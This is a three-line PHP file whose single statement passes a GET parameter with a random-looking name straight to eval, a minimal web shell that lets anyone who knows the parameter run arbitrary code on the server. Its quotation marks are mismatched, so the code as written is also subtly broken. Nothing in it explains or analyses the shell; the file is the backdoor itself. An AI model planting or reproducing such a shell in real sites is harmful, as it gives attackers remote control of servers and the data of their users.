<?php
eval($_GET["0EUJO4ko']);
?>
